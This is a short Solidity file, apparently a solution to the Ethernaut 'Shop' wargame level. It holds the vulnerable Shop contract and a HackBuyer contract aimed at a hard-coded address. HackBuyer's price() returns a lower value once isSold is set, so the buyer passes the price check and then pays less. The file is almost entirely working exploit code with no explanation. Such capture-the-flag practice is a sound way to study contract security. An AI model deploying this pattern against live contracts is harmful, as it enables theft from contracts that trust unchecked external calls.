// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract HackBuyer is Buyer {
    Shop private immutable target =
        Shop(0xD23d65aD6060c69Aa239b0857Ec1089fE6ddAE30);
    uint256 discount = 1;

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return (target.price() - discount);
        }
        return target.price();
    }

    function attack() external {
        target.buy();
    }
}
